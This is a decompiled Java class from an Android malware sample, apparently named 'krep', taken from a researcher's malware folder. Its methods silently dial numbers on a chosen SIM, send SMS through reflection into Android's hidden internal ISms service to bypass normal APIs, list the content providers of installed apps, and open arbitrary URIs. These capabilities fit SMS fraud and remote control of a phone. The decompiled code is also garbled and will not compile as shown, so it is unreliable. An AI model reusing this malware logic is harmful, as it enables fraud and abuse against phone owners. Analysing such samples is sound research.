package krep.itmtd.ywtjexf;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ProviderInfo;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MeSystem
{
  Context mContext;
  
  MeSystem(Context paramContext)
  {
    this.mContext = paramContext;
  }
  
  public void Log(String paramString)
  {
    Log.i("MeSystem.Log", paramString);
  }
  
  public void call(String paramString)
  {
    call(paramString, 0);
  }
  
  public void call(String paramString, int paramInt)
  {
    paramString = paramString.replace("#", Uri.encode("#"));
    paramString = new Intent("android.intent.action.CALL", Uri.parse("tel:" + paramString));
    paramString.putExtra("com.android.phone.extra.slot", paramInt);
    paramString.putExtra("simSlot", paramInt);
    paramString.setFlags(805306368);
    this.mContext.startActivity(paramString);
  }
  
  public String dualsim()
  {
    return "erere";
  }
  
  public String providers()
    throws JSONException
  {
    JSONObject localJSONObject1 = new JSONObject();
    JSONArray localJSONArray = new JSONArray();
    Iterator localIterator = this.mContext.getPackageManager().getInstalledPackages(8).iterator();
    for (;;)
    {
      if (!localIterator.hasNext())
      {
        localJSONObject1.put("result", localJSONArray);
        return localJSONObject1.toString();
      }
      ProviderInfo[] arrayOfProviderInfo = ((PackageInfo)localIterator.next()).providers;
      if (arrayOfProviderInfo != null)
      {
        int j = arrayOfProviderInfo.length;
        int i = 0;
        while (i < j)
        {
          ProviderInfo localProviderInfo = arrayOfProviderInfo[i];
          JSONObject localJSONObject2 = new JSONObject();
          localJSONObject2.put("name", localProviderInfo.authority);
          localJSONArray.put(localJSONObject2);
          i += 1;
        }
      }
    }
  }
  
  public boolean sendMultipartTextSMS(int paramInt, String paramString, ArrayList<String> paramArrayList)
  {
    Context localContext = this.mContext;
    if (paramInt == 0) {}
    for (Object localObject = "isms";; localObject = "isms2") {
      label239:
      do
      {
        try
        {
          Method localMethod = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
          localMethod.setAccessible(true);
          localObject = localMethod.invoke(null, new Object[] { localObject });
          localMethod = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", new Class[] { IBinder.class });
          localMethod.setAccessible(true);
          localObject = localMethod.invoke(null, new Object[] { localObject });
          if (Build.VERSION.SDK_INT >= 18) {
            break label239;
          }
          localObject.getClass().getMethod("sendMultipartText", new Class[] { String.class, String.class, List.class, List.class, List.class }).invoke(localObject, new Object[] { paramString, null, paramArrayList, null, null });
        }
        catch (ClassNotFoundException paramString)
        {
          Log.e("apipas", "ClassNotFoundException:" + paramString.getMessage());
          return false;
          localObject.getClass().getMethod("sendMultipartText", new Class[] { String.class, String.class, String.class, List.class, List.class, List.class }).invoke(localObject, new Object[] { localContext.getPackageName(), paramString, null, paramArrayList, null, null });
        }
        catch (NoSuchMethodException paramString)
        {
          for (;;)
          {
            Log.e("apipas", "NoSuchMethodException:" + paramString.getMessage());
          }
        }
        catch (InvocationTargetException paramString)
        {
          for (;;)
          {
            Log.e("apipas", "InvocationTargetException:" + paramString.getMessage());
          }
        }
        catch (IllegalAccessException paramString)
        {
          for (;;)
          {
            Log.e("apipas", "IllegalAccessException:" + paramString.getMessage());
          }
        }
        catch (Exception paramString)
        {
          for (;;)
          {
            Log.e("apipas", "Exception:" + paramString.getMessage());
          }
        }
        throw new Exception("can not get service which for sim '" + paramInt + "', only 0,1 accepted as values");
        return true;
      } while (paramInt != 1);
    }
  }
  
  public void sendSMS(String paramString1, String paramString2)
  {
    SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, null, null);
  }
  
  public boolean sendSMS(int paramInt, String paramString1, String paramString2)
  {
    Context localContext = this.mContext;
    if (paramInt == 0) {}
    for (Object localObject = "isms";; localObject = "isms2") {
      label242:
      do
      {
        try
        {
          Method localMethod = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[] { String.class });
          localMethod.setAccessible(true);
          localObject = localMethod.invoke(null, new Object[] { localObject });
          localMethod = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", new Class[] { IBinder.class });
          localMethod.setAccessible(true);
          localObject = localMethod.invoke(null, new Object[] { localObject });
          if (Build.VERSION.SDK_INT >= 18) {
            break label242;
          }
          localObject.getClass().getMethod("sendText", new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class }).invoke(localObject, new Object[] { paramString1, null, paramString2, null, null });
        }
        catch (ClassNotFoundException paramString1)
        {
          Log.e("apipas", "ClassNotFoundException:" + paramString1.getMessage());
          return false;
          localObject.getClass().getMethod("sendText", new Class[] { String.class, String.class, String.class, String.class, PendingIntent.class, PendingIntent.class }).invoke(localObject, new Object[] { localContext.getPackageName(), paramString1, null, paramString2, null, null });
        }
        catch (NoSuchMethodException paramString1)
        {
          for (;;)
          {
            Log.e("apipas", "NoSuchMethodException:" + paramString1.getMessage());
          }
        }
        catch (InvocationTargetException paramString1)
        {
          for (;;)
          {
            Log.e("apipas", "InvocationTargetException:" + paramString1.getMessage());
          }
        }
        catch (IllegalAccessException paramString1)
        {
          for (;;)
          {
            Log.e("apipas", "IllegalAccessException:" + paramString1.getMessage());
          }
        }
        catch (Exception paramString1)
        {
          for (;;)
          {
            Log.e("apipas", "Exception:" + paramString1.getMessage());
          }
        }
        throw new Exception("can not get service which for sim '" + paramInt + "', only 0,1 accepted as values");
        return true;
      } while (paramInt != 1);
    }
  }
  
  public void showToast(String paramString)
  {
    Toast.makeText(this.mContext, paramString, 0).show();
  }
  
  public void start(String paramString)
  {
    paramString = new Intent("android.intent.action.VIEW", Uri.parse(paramString));
    this.mContext.startActivity(paramString);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MeSystem.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */